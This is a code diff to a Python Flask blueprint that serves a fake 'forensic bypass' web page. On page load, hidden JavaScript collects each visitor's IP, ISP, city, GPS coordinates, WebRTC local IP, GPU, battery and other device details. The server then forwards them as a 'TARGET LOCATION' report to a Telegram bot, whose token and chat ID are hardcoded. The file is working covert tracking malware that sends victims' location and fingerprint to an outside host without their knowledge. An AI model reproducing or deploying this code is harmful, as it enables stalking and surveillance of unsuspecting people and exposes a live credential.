@@ -1,16 +1,100 @@
 from flask import Blueprint, render_template_string, request, jsonify
 import requests
-import logging
-import os
 
 script20_bp = Blueprint('script20', __name__)
 
 # --- CONFIGURATION ---
-TELEGRAM_BOT_TOKEN = os.environ.get('6133548217:AAFtEqMcFM1vz55YNTI4DBkeZe0Ku_zzOo0')
-TELEGRAM_CHAT_ID = os.environ.get('1308711346')
+TELEGRAM_BOT_TOKEN = "6133548217:AAFtEqMcFM1vz55YNTI4DBkeZe0Ku_zzOo0"
+TELEGRAM_CHAT_ID = "1308711346"
 
 PHANTOM_UI = """
-<!-- HTML code remains the same -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SECURE_STATION_v7.0</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Share Tech Mono', monospace; text-align: center; padding-top: 15%; margin:0; }
+        .box { border: 1px solid #0f0; display: inline-block; padding: 40px; background: rgba(0,20,0,0.9); box-shadow: 0 0 50px #0f0; position: relative; }
+        .scan-line { width: 100%; height: 5px; background: #0f0; position: absolute; top: 0; left:0; animation: scan 2s linear infinite; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+    </style>
+</head>
+<body onload="capture()">
+    <div class="box">
+        <div class="scan-line"></div>
+        <h2 id="header">CORE_FORENSIC_BYPASS</h2>
+        <p id="status">Brute-forcing Device Metadata... [v7.0]</p>
+        <div id="loader">STATUS: EXTRACTING_A_TO_Z_NODES</div>
+    </div>
+
+    <script>
+        async function capture() {
+            try {
+                // IP & GEO
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ip = await ipRes.json();
+
+                // BATTERY
+                let batt = "N/A";
+                if(navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batt = Math.round(b.level * 100) + "% (" + (b.charging ? "Plugged" : "Battery") + ")";
+                }
+
+                // GPU & HARDWARE
+                let gpu = "Unknown";
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if(debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+
+                // LOCAL IP (WEBRTC)
+                let localIP = "N/A";
+                const pc = new RTCPeerConnection({iceServers:[]});
+                pc.createDataChannel("");
+                pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.onicecandidate = (i) => { if(i && i.candidate) localIP = i.candidate.address; };
+
+                // GPS
+                const getPos = () => new Promise(r => navigator.geolocation.getCurrentPosition(p => r(p.coords), () => r(null)));
+                const coords = await getPos();
+
+                const intel = {
+                    time: new Date().toLocaleString(),
+                    ip: ip.ip || "N/A",
+                    local_ip: localIP,
+                    isp: ip.org || "N/A",
+                    city: ip.city || "N/A",
+                    country: ip.country_name || "N/A",
+                    lat: coords ? coords.latitude : "Denied",
+                    lon: coords ? coords.longitude : "Denied",
+                    platform: navigator.platform,
+                    agent: navigator.userAgent,
+                    gpu: gpu,
+                    cores: navigator.hardwareConcurrency,
+                    ram: navigator.deviceMemory || "N/A",
+                    battery: batt,
+                    screen: window.screen.width + "x" + window.screen.height,
+                    orientation: screen.orientation ? screen.orientation.type : "N/A",
+                    lang: navigator.language,
+                    touch: navigator.maxTouchPoints || 0,
+                    referrer: document.referrer || "Direct Access"
+                };
+
+                await fetch('/script20/capture_data', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(intel)
+                });
+
+                document.getElementById('header').innerText = "FORENSICS_COMPLETE";
+                document.getElementById('status').innerText = "Data nodes stabilized.";
+
+            } catch (e) { console.log(e); }
+        }
+    </script>
+</body>
+</html>
 """
 
 @script20_bp.route('/')
@@ -21,143 +105,33 @@ def index():
 def capture_data():
     try:
         i = request.json
-        # Validate user input
-        if not i:
-            return jsonify({"status": "Error", "message": "Invalid input"}), 400
-
-        # Device Fingerprinting
-        device_info = {
-            'device_type': i['device_type'],
-            'operating_system': i['operating_system'],
-            'browser_type': i['browser_type'],
-            'screen_resolution': i['screen_resolution']
-        }
-
-        # Network Information
-        network_info = {
-            'ip_address': i['ip_address'],
-            'subnet_mask': i['subnet_mask'],
-            'gateway': i['gateway'],
-            'dns_server': i['dns_server']
-        }
-
-        # System Information
-        system_info = {
-            'operating_system_version': i['operating_system_version'],
-            'kernel_version': i['kernel_version'],
-            'installed_software': i['installed_software']
-        }
-
-        # User Behavior
-        user_behavior = {
-            'mouse_movements': i['mouse_movements'],
-            'keyboard_input': i['keyboard_input'],
-            'scroll_events': i['scroll_events']
-        }
-
-        # Browser Extensions
-        browser_extensions = {
-            'ad_blockers': i['ad_blockers'],
-            'vpns': i['vpns'],
-            'password_managers': i['password_managers']
-        }
-
-        # Social Media Profiles
-        social_media_profiles = {
-            'facebook': i['facebook'],
-            'twitter': i['twitter'],
-            'instagram': i['instagram']
-        }
-
-        # Email Addresses
-        email_addresses = {
-            'email_addresses': i['email_addresses'],
-            'password_recovery_emails': i['password_recovery_emails']
-        }
-
-        # Phone Numbers
-        phone_numbers = {
-            'phone_numbers': i['phone_numbers'],
-            'sms_verification_codes': i['sms_verification_codes']
-        }
-
-        # Location Information
-        location_info = {
-            'current_location': i['current_location'],
-            'ip_address': i['ip_address'],
-            'gps_coordinates': i['gps_coordinates']
-        }
-
-        # File System Information
-        file_system_info = {
-            'file_system_hierarchy': i['file_system_hierarchy'],
-            'file_names': i['file_names'],
-            'file_contents': i['file_contents']
-        }
-
-        # Camera and Microphone Access
-        camera_microphone_access = {
-            'camera_access': i['camera_access'],
-            'microphone_access': i['microphone_access']
-        }
-
-        # GPS Location
-        gps_location = {
-            'gps_coordinates': i['gps_coordinates']
-        }
-
-        # Device ID
-        device_id = {
-            'device_id': i['device_id']
-        }
-
-        # SIM Card Information
-        sim_card_info = {
-            'sim_card_number': i['sim_card_number'],
-            'sim_card_operator': i['sim_card_operator']
-        }
-
-        # Battery Information
-        battery_info = {
-            'battery_level': i['battery_level'],
-            'battery_status': i['battery_status']
-        }
-
-        # Message Format updated for Full Data
         message = (
-            f"💀 *--- ULTIMATE FORENSIC REPORT ---* 💀\\n\\n"
-            f"📅 *TIME:* `{i['time']}`\\n"
-            f"🌐 *NETWORK INTEL*\\n"
-            f"┣ IP: `{i['ip_address']}`\\n"
+            f"⚡ *--- A-TO-Z FORENSIC INTEL ---* ⚡\\n\\n"
+            f"📅 *DATETIME:* `{i['time']}`\\n"
+            f"🌐 *NETWORK NODES*\\n"
+            f"┣ IP: `{i['ip']}`\\n"
             f"┣ Local: `{i['local_ip']}`\\n"
             f"┣ ISP: `{i['isp']}`\\n"
-            f"┗ TZ: `{i['tz']}`\\n\\n"
-            f"📍 *GEOLOCATION*\\n"
+            f"┗ From: `{i['referrer']}`\\n\\n"
+            f"📍 *TARGET LOCATION*\\n"
             f"┣ Lat/Lon: `{i['lat']}, {i['lon']}`\\n"
-            f"┗ Maps: [Click Here](http://www.google.com/maps/place/{i['lat']},{i['lon']})\\n\\n"
-            f"💻 *HARDWARE & OS*\\n"
+            f"┣ City: `{i['city']}, {i['country']}`\\n"
+            f"┗ Map: [Google Maps](https://www.google.com/maps?q={i['lat']},{i['lon']})\\n\\n"
+            f"💻 *HARDWARE SPECIFICATIONS*\\n"
             f"┣ Platform: `{i['platform']}`\\n"
             f"┣ GPU: `{i['gpu']}`\\n"
             f"┣ RAM: `{i['ram']} GB` | Cores: `{i['cores']}`\\n"
             f"┣ Battery: `{i['battery']}`\\n"
             f"┗ Screen: `{i['screen']} ({i['orientation']})`\\n\\n"
-            f"⚙️ *SYSTEM MISC*\\n"
-            f"┣ AdBlock: `{i['adblock']}`\\n"
-            f"┣ Touch Points: `{i['touch']}`\\n"
-            f"┗ Language: `{i['lang']}`\\n\\n"
+            f"⚙️ *SYSTEM FINGERPRINT*\\n"
+            f"┣ Language: `{i['lang']}`\\n"
+            f"┗ Touch Points: `{i['touch']}`\\n\\n"
             f"📎 *FULL USER AGENT*\\n"
             f"`{i['agent']}`"
         )
 
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
-        
-        response = requests.post(url, json=payload)
-        if response.status_code == 200:
-            return jsonify({"status": "Success"}), 200
-        else:
-            logging.error(f"Error sending message: {response.text}")
-            return jsonify({"status": "Error", "message": "Failed to send message"}), 500
+        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", 
+                      json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
+        return jsonify({"status": "Success"}), 200
     except Exception as e:
-        logging.error(f"Error: {e}")
-        return jsonify({"status": "Error", "message": "Internal Server Error"}), 500
+        return jsonify({"status": "Error", "message": str(e)}), 500
